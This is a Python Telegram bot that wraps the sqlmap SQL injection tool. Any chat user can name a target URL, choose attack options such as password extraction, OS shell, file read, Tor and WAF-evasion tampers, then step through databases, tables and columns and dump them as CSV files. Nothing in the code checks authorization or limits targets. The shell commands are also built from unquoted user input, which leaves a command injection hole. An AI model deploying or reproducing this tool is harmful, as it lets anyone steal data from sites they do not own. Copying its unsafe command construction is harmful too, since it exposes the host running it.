import os
import asyncio
import re
from collections import defaultdict
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

user_sessions = defaultdict(lambda: {'url': None, 'options': set(), 'page': 0, 'session_id': None, 'custom_args': '', 'dump_state': None, 'databases': [], 'tables': [], 'columns': [], 'selected_db': None, 'selected_table': None})

ALL_OPTIONS = [
    {'Databases': '--dbs', 'Tables': '--tables', 'Columns': '--columns', 'Dump All': '--dump-all'},
    {'Current DB': '--current-db', 'Current User': '--current-user', 'Hostname': '--hostname', 'Passwords': '--passwords'},
    {'Batch': '--batch', 'Risk 3': '--risk=3', 'Level 5': '--level=5', 'Verbose': '-v 3'},
    {'Crawl': '--crawl=2', 'Forms': '--forms', 'Level 2': '--level=2', 'Random Agent': '--random-agent'},
    {'Threads 5': '--threads=5', 'Retry 3': '--retries=3', 'Timeout 30': '--timeout=30', 'Delay 0': '--delay=0'},
    {'Tamper Space2Comment': '--tamper=space2comment', 'Technique BEUST': '--technique=BEUST', 'Fingerprint': '--fingerprint', 'Banner': '--banner'},
    {'Schema': '--schema', 'Count': '--count', 'Search': '--search', 'Comments': '--comments'},
    {'OS Shell': '--os-shell', 'File Read': '--file-read', 'File Write': '--file-write', 'Privileges': '--privileges'},
    {'Union Cols': '--union-cols=12', 'Time Sec 5': '--time-sec=5', 'Auth Type': '--auth-type=Basic', 'Proxy': '--proxy'},
    {'Test Filter': '--test-filter', 'Skip Static': '--skip-static', 'Randomize': '--randomize', 'Keep Alive': '--keep-alive'},
    {'Dump Table': '--dump -T', 'Database': '-D', 'Exclude SysDB': '--exclude-sysdbs', 'Where': '--where'},
    {'DBMS': '--dbms', 'OS': '--os', 'Tamper': '--tamper', 'SQL Query': '--sql-query'},
    {'Tor': '--tor', 'Force SSL': '--force-ssl', 'Cookie': '--cookie', 'User Agent': '--user-agent'},
    {'All': '-a', 'Is DBA': '--is-dba', 'Users': '--users', 'Roles': '--roles'}
]

def create_keyboard(user_id, page=0):
    keyboard = []
    options = ALL_OPTIONS[page]
    
    row = []
    for label, value in options.items():
        session = user_sessions[user_id]
        prefix = "✅ " if value in session['options'] else ""
        row.append(InlineKeyboardButton(f"{prefix}{label}", callback_data=f"opt_{page}_{label}"))
        if len(row) == 2:
            keyboard.append(row)
            row = []
    if row:
        keyboard.append(row)
    
    nav_row = []
    if page > 0:
        nav_row.append(InlineKeyboardButton("◀️ Previous", callback_data=f"page_{page-1}"))
    if page < len(ALL_OPTIONS) - 1:
        nav_row.append(InlineKeyboardButton("Next ▶️", callback_data=f"page_{page+1}"))
    if nav_row:
        keyboard.append(nav_row)
    
    keyboard.append([InlineKeyboardButton("✔️ Done", callback_data="done")])
    return InlineKeyboardMarkup(keyboard)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🔰 SQLMap Bot\n\n"
        "Commands:\n"
        "• /sqlmap <URL> - Start scan with options\n"
        "• /dump - Interactive dump (DB → Table → Columns)\n"
        "• /continue - Add more options to scan"
    )

async def sqlmap_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not context.args:
        await update.message.reply_text("❌ Usage: /sqlmap http://target.com?id=1")
        return
    
    url = context.args[0]
    if not re.match(r'https?://', url):
        await update.message.reply_text("❌ Invalid URL")
        return
    
    session_id = re.sub(r'[^a-zA-Z0-9]', '_', url)[:50]
    
    # Update session instead of replacing it
    session = user_sessions[user_id]
    session['url'] = url
    session['session_id'] = session_id
    session['options'] = set()
    session['page'] = 0
    session['custom_args'] = ''
    
    await update.message.reply_text(
        f"🌐 Target: `{url}`\n\n**Page 1/{len(ALL_OPTIONS)}**\n\n"
        f"💡 Use /dump for interactive database dumping",
        reply_markup=create_keyboard(user_id, 0),
        parse_mode='Markdown'
    )

async def continue_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    session = user_sessions.get(user_id)
    
    if not session or not session['url']:
        await update.message.reply_text("❌ No active session. Start with /sqlmap <URL>")
        return
    
    await update.message.reply_text(
        f"💠 Continue: `{session['url']}`\n\n**Page 1/{len(ALL_OPTIONS)}**",
        reply_markup=create_keyboard(user_id, 0),
        parse_mode='Markdown'
    )

async def dump_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    session = user_sessions.get(user_id)
    
    if not session or not session['url']:
        await update.message.reply_text("❌ No active session. Start with /sqlmap <URL>")
        return
    
    await update.message.reply_text("🔍 Fetching databases...")
    
    # Get databases
    cmd = f"python sqlmap.py -u {session['url']} --dbs --batch"
    proc = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT, cwd=os.path.dirname(__file__))
    output, _ = await proc.communicate()
    
    # Parse databases
    dbs = []
    for line in output.decode().split('\n'):
        if line.strip().startswith('[*]'):
            db = line.strip()[4:].strip()
            if db and db not in ['information_schema', 'performance_schema', 'mysql', 'sys']:
                dbs.append(db)
    
    if not dbs:
        await update.message.reply_text("❌ No databases found")
        return
    
    session['databases'] = dbs
    session['dump_state'] = 'select_db'
    
    keyboard = [[InlineKeyboardButton(db, callback_data=f"db_{db}")] for db in dbs]
    await update.message.reply_text("📊 Select database:", reply_markup=InlineKeyboardMarkup(keyboard))

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = update.effective_user.id
    session = user_sessions[user_id]
    
    try:
        await query.answer()
    except Exception:
        pass
    
    data = query.data
    
    # Database selection
    if data.startswith("db_"):
        db_name = data[3:]
        session['selected_db'] = db_name
        await query.edit_message_text("🔍 Fetching tables...")
        
        cmd = f"python sqlmap.py -u {session['url']} -D {db_name} --tables --batch"
        proc = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT, cwd=os.path.dirname(__file__))
        output, _ = await proc.communicate()
        
        tables = []
        for line in output.decode().split('\n'):
            if line.strip().startswith('|') and '|' in line[1:]:
                parts = [p.strip() for p in line.split('|')]
                if len(parts) > 1 and parts[1] and parts[1] not in ['Table', '']:
                    tables.append(parts[1])
        
        if not tables:
            await query.edit_message_text("❌ No tables found")
            return
        
        session['tables'] = tables
        session['dump_state'] = 'select_table'
        
        keyboard = [[InlineKeyboardButton(t, callback_data=f"tbl_{t}")] for t in tables]
        await query.edit_message_text(f"📋 Select table from {db_name}:", reply_markup=InlineKeyboardMarkup(keyboard))
    
    # Table selection
    elif data.startswith("tbl_"):
        table_name = data[4:]
        session['selected_table'] = table_name
        await query.edit_message_text("🔍 Fetching columns...")
        
        cmd = f"python sqlmap.py -u {session['url']} -D {session['selected_db']} -T {table_name} --columns --batch"
        proc = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT, cwd=os.path.dirname(__file__))
        output, _ = await proc.communicate()
        
        columns = []
        for line in output.decode().split('\n'):
            if line.strip().startswith('|') and '|' in line[1:]:
                parts = [p.strip() for p in line.split('|')]
                if len(parts) > 1 and parts[1] and parts[1] not in ['Column', '']:
                    columns.append(parts[1])
        
        if not columns:
            await query.edit_message_text("❌ No columns found")
            return
        
        session['columns'] = columns
        session['dump_state'] = 'select_columns'
        
        keyboard = [[InlineKeyboardButton(f"{'✅ ' if c in session.get('selected_columns', set()) else ''}{c}", callback_data=f"col_{c}")] for c in columns]
        keyboard.append([InlineKeyboardButton("🔰 Dump All Columns", callback_data="dump_all")])
        keyboard.append([InlineKeyboardButton("✔️ Dump Selected", callback_data="dump_selected")])
        
        await query.edit_message_text(f"📝 Select columns from {table_name}:", reply_markup=InlineKeyboardMarkup(keyboard))
    
    # Column selection
    elif data.startswith("col_"):
        col_name = data[4:]
        if 'selected_columns' not in session:
            session['selected_columns'] = set()
        
        if col_name in session['selected_columns']:
            session['selected_columns'].remove(col_name)
        else:
            session['selected_columns'].add(col_name)
        
        keyboard = [[InlineKeyboardButton(f"{'✅ ' if c in session['selected_columns'] else ''}{c}", callback_data=f"col_{c}")] for c in session['columns']]
        keyboard.append([InlineKeyboardButton("🔰 Dump All Columns", callback_data="dump_all")])
        keyboard.append([InlineKeyboardButton("✔️ Dump Selected", callback_data="dump_selected")])
        
        try:
            await query.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup(keyboard))
        except Exception:
            pass
    
    # Dump all columns
    elif data == "dump_all":
        session['custom_args'] = f"-D {session['selected_db']} --dump -T {session['selected_table']} --batch"
        await query.edit_message_text("🔰 Dumping all columns... 🔰")
        await run_scan(update.effective_chat.id, user_id, context)
    
    # Dump selected columns
    elif data == "dump_selected":
        if not session.get('selected_columns'):
            try:
                await query.answer("❌ Select at least one column", show_alert=True)
            except Exception:
                pass
            return
        
        cols = ','.join(session['selected_columns'])
        session['custom_args'] = f"-D {session['selected_db']} --dump -T {session['selected_table']} -C {cols} --batch"
        await query.edit_message_text(f"🔰 Dumping columns: {cols}... 🔰")
        await run_scan(update.effective_chat.id, user_id, context)
        session['selected_columns'] = set()
    
    elif data.startswith("opt_"):
        _, page, label = data.split("_", 2)
        page = int(page)
        value = ALL_OPTIONS[page][label]
        
        if value in session['options']:
            session['options'].remove(value)
            try:
                await query.answer(f"➖ {label}")
            except Exception:
                pass
        else:
            session['options'].add(value)
            try:
                await query.answer(f"➕ {label}")
            except Exception:
                pass
        
        try:
            await query.edit_message_reply_markup(reply_markup=create_keyboard(user_id, page))
        except Exception:
            pass
    
    elif data.startswith("page_"):
        page = int(data.split("_")[1])
        session['page'] = page
        await query.edit_message_text(
            f"🌐 Target: `{session['url']}`\n\n**Page {page+1}/{len(ALL_OPTIONS)}**",
            reply_markup=create_keyboard(user_id, page),
            parse_mode='Markdown'
        )
    
    elif data == "done":
        if not session['options']:
            try:
                await query.answer("❌ Select at least one option", show_alert=True)
            except Exception:
                pass
            return
        
        try:
            await query.answer("🔰 Starting... 🔰")
        except Exception:
            pass
        await run_scan(update.effective_chat.id, user_id, context)

async def run_scan(chat_id, user_id, context):
    session = user_sessions[user_id]
    url = session['url']
    opts = ' '.join(session['options'])
    custom = session.get('custom_args', '')
    
    cmd = f"python sqlmap.py -u '{url}' {custom if custom else opts} --batch"
    
    status_msg = await context.bot.send_message(chat_id, f"⏳ Starting scan...", parse_mode='Markdown')
    
    try:
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
            cwd=os.path.dirname(__file__)
        )
        
        output = []
        async for line in proc.stdout:
            line_text = line.decode().strip()
            output.append(line_text)
            if len(output) % 10 == 0:
                try:
                    await status_msg.edit_text(f"⏳ Processing...\n```\n{line_text[:200]}\n```", parse_mode='Markdown')
                except Exception:
                    pass
        
        await proc.wait()
        full_output = '\n'.join(output)
        chunks = [full_output[i:i+3900] for i in range(0, len(full_output), 3900)]
        
        await status_msg.edit_text(f"✅ Complete! @{context.bot.username}")
        for chunk in chunks[:3]:
            await context.bot.send_message(chat_id, f"```\n{chunk}\n```", parse_mode='Markdown')
        
        # Send CSV results file
        # Check multiple possible locations
        possible_dirs = [
            os.path.join(os.path.dirname(__file__), '.sqlmap', 'output'),
            os.path.expanduser('~/.local/share/sqlmap/output'),
            '/opt/render/.local/share/sqlmap/output'
        ]
        
        for log_dir in possible_dirs:
            if os.path.exists(log_dir):
                for root, dirs, files in os.walk(log_dir):
                    for file in files:
                        if file.endswith('.csv') or file.endswith('.txt'):
                            path = os.path.join(root, file)
                            try:
                                if os.path.getsize(path) < 50000000:
                                    with open(path, 'rb') as f:
                                        await context.bot.send_document(chat_id, document=f, filename=file, caption=f"📄 Results")
                            except Exception:
                                pass
    except Exception as e:
        await status_msg.edit_text(f"❌ {str(e)}")
    finally:
        # Clear only options, keep URL and session for /continue and /dump
        session['options'].clear()
        session['custom_args'] = ''
        # Don't clear url, session_id, or dump-related fields

def main():
    token = os.getenv('TELEGRAM_TOKEN')
    if not token:
        print("Error: TELEGRAM_TOKEN not set")
        exit(1)
    
    app = Application.builder().token(token).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("sqlmap", sqlmap_cmd))
    app.add_handler(CommandHandler("continue", continue_cmd))
    app.add_handler(CommandHandler("dump", dump_cmd))
    app.add_handler(CallbackQueryHandler(button_callback))
    
    print("Bot started")
    
    # Use webhook for cloud deployment
    port = int(os.getenv('PORT', 8443))
    webhook_url = os.getenv('WEBHOOK_URL')
    
    if webhook_url:
        app.run_webhook(
            listen="0.0.0.0",
            port=port,
            url_path=token,
            webhook_url=f"{webhook_url}/{token}"
        )
    else:
        app.run_polling()

if __name__ == "__main__":
    main()
